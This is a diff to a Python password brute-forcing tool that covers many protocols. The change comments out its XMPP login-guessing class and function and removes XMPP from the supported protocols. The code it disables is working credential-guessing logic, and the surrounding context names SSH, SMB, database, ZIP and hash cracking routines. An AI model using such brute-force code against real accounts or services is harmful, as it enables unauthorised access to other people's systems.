@@ -15,7 +15,7 @@ import smtplib         # SMTP
 import pymysql         # MySQL
 import psycopg2        # PostgreSQL
 import pymssql         # MS SQL
-import slixmpp         # XMPP (modern and maintained)
+# import slixmpp      # XMPP (modern and maintained) - REMOVED
 import hashlib         # for hash check
 import zipfile         # ZIP bruteforce
 import PyPDF2          # PDF password check
@@ -244,44 +244,44 @@ def irc_bruteforce(username, password, target_ip, port=6667, debug=False):
         return False
 
 # XMPP (using slixmpp)
-class XmppBrute(slixmpp.ClientXMPP):
-    def __init__(self, jid, password):
-        super().__init__(jid, password)
-        self.success = False
-        self.add_event_handler("session_start", self.start)
-        self.add_event_handler("failed_auth", self.failed)
-        self.add_event_handler("disconnected", self.disconnected)
-        self.connect_error = None
+# class XmppBrute(slixmpp.ClientXMPP):
+#     def __init__(self, jid, password):
+#         super().__init__(jid, password)
+#         self.success = False
+#         self.add_event_handler("session_start", self.start)
+#         self.add_event_handler("failed_auth", self.failed)
+#         self.add_event_handler("disconnected", self.disconnected)
+#         self.connect_error = None
 
-    async def start(self, event):
-        self.success = True
-        self.disconnect()
+#     async def start(self, event):
+#         self.success = True
+#         self.disconnect()
 
-    async def failed(self, event):
-        self.success = False
-        self.disconnect()
+#     async def failed(self, event):
+#         self.success = False
+#         self.disconnect()
 
-    async def disconnected(self, event):
-        pass
+#     async def disconnected(self, event):
+#         pass
 
-def xmpp_bruteforce(username, password, target_ip, port=5222, debug=False):
-    jid = username # Should be a full JID like user@domain
-    xmpp = XmppBrute(jid, password)
-    try:
-        # Connect to a specific server/port
-        if xmpp.connect((target_ip, port), use_tls=True):
-            xmpp.process(forever=False, timeout=5)
-            if xmpp.success:
-                return True
-            else:
-                print_dbg(f"XMPP fail: {username}:{password} -> authentication failed", debug)
-                return False
-        else:
-            print_error(f"XMPP connection refused or timed out for {target_ip}:{port}", debug)
-            return False
-    except Exception as e:
-        print_dbg(f"XMPP error {username}:{password} -> {e}", debug)
-        return False
+# def xmpp_bruteforce(username, password, target_ip, port=5222, debug=False):
+#     jid = username # Should be a full JID like user@domain
+#     xmpp = XmppBrute(jid, password)
+#     try:
+#         # Connect to a specific server/port
+#         if xmpp.connect((target_ip, port), use_tls=True):
+#             xmpp.process(forever=False, timeout=5)
+#             if xmpp.success:
+#                 return True
+#             else:
+#                 print_dbg(f"XMPP fail: {username}:{password} -> authentication failed", debug)
+#                 return False
+#         else:
+#             print_error(f"XMPP connection refused or timed out for {target_ip}:{port}", debug)
+#             return False
+#     except Exception as e:
+#         print_dbg(f"XMPP error {username}:{password} -> {e}", debug)
+#         return False
 
 # Hash bruteforce (try multiple hash types)
 def hash_bruteforce(target_hash, password_list, debug=False):
@@ -452,7 +452,7 @@ def main():
     target_ip = None
     target_port = args.port
 
-    if proto in ["ssh", "ftp", "smb", "xmpp", "irc", "oracle", "mssql", "postgres"]:
+    if proto in ["ssh", "ftp", "smb", "irc", "oracle", "mssql", "postgres"]:
         if ":" in target_rest:
             ip, port_str = target_rest.split(":", 1)
             target_ip = ip
@@ -498,8 +498,9 @@ def main():
         target_func = lambda u, p: mssql_bruteforce(u, p, target_ip, port=target_port or 1433, debug=args.dbg)
     elif proto == "irc":
         target_func = lambda u, p: irc_bruteforce(u, p, target_ip, port=target_port or 6667, debug=args.dbg)
-    elif proto == "xmpp":
-        target_func = lambda u, p: xmpp_bruteforce(u, p, target_ip, port=target_port or 5222, debug=args.dbg)
+    # REMOVED XMPP support
+    # elif proto == "xmpp":
+    #     target_func = lambda u, p: xmpp_bruteforce(u, p, target_ip, port=target_port or 5222, debug=args.dbg)
     else:
         print(f"[-] Protocol {proto} not implemented.")
         sys.exit(1)
